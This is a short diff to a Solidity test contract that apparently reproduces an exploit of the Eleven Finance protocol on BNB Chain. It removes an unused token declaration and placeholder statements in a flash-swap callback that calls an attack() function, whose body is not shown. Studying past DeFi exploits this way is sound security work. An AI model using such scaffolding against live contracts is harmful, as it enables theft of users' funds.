@@ -24,8 +24,6 @@ contract Eleven is DSTest {
 
   IERC20 nrv = IERC20(0x42F6f551ae042cBe50C739158b4f0CAC0Edb9096);
 
-  IERC20 xnrv = IERC20(0x15B9462d4Eb94222a7506Bc7A25FB27a2359291e);
-
   IERC20 busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56); 
 
   IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
@@ -83,12 +81,9 @@ contract Eleven is DSTest {
     uint256 amount1,
     bytes calldata data
   ) external {
-    sender;
-    data;
-    amount0;
-    amount1;
 
     attack();
+    
   }
 
   function attack() public {
